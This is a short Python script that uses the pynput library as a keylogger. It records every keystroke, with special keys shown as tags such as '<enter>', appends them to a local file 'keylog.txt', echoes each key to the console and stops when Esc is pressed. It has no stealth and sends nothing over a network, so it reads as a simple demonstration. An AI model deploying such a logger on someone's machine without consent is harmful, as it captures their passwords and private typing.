from pynput.keyboard import Key, Listener
import logging

logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format='%(message)s', filemode='a')


def parse_key(key):
    if isinstance(key, Key):
        if key == Key.space:
            return "<space>"
        elif key == Key.enter:
            return "<enter>"
        elif key == Key.tab:
            return "<tab>"
        elif key == Key.backspace:
            return "<backspace>"
        elif key == Key.shift:
            return "<shift>"
        elif key == Key.ctrl_l or key == Key.ctrl_r:
            return "<ctrl>"
        elif key == Key.alt_l or key == Key.alt_r:
            return "<alt>"
        elif key == Key.esc:
            return "<esc>"
        else:
            return f"<{key.name}>"
    else:
        return key


def on_press(key):
    key = parse_key(key)
    logging.info(str(key))
    print(f"Pressed {key}")
    
    if key == "<esc>":
        listener.stop()


if __name__ == "__main__":
    with Listener(on_press=on_press) as listener:
        listener.join()
